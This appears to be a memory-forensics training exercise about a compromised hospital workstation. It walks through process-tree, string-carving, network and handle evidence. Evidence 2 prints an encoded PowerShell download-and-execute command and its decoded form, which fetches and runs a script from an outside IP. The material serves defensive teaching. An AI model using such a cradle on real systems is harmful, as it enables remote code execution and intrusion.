## Full Memory Investigation

A hospital workstation was taken offline after the EDR flagged unusual behavior at 02:14 AM. No one was supposed to be logged in at that time. You receive a full memory image and need to piece together what happened.

Work through the evidence below in order.

---

## Evidence 1 - Process Tree

You run `pstree` and extract the relevant part:

```
lsass.exe (PID 648)
  └── cmd.exe (PID 4412)
        └── powershell.exe (PID 4480)
              └── rundll32.exe (PID 4501)
```

---

## Evidence 2 - PowerShell Command in Memory

You carve strings from PID 4480:

```
powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAyAC4ANAAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
```

Decoded, this Base64 string translates to:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://185.220.102.41/payload.ps1')
```

---

## Evidence 3 - Network Connections

`netscan` output:

```
Proto  Local           Foreign                  State    PID   Process
TCP    10.0.0.12:51002  185.220.102.41:80       ESTAB    4480  powershell.exe
TCP    10.0.0.12:51018  185.220.102.41:4444     ESTAB    4501  rundll32.exe
```

---

## Evidence 4 - LSASS Handle

You run `handles` on PID 4412 and find:

```
Handle  Type    Details
------  ------  -------
0x48    Process lsass.exe (PID 648)
```

`cmd.exe` has an open handle to `lsass.exe`.
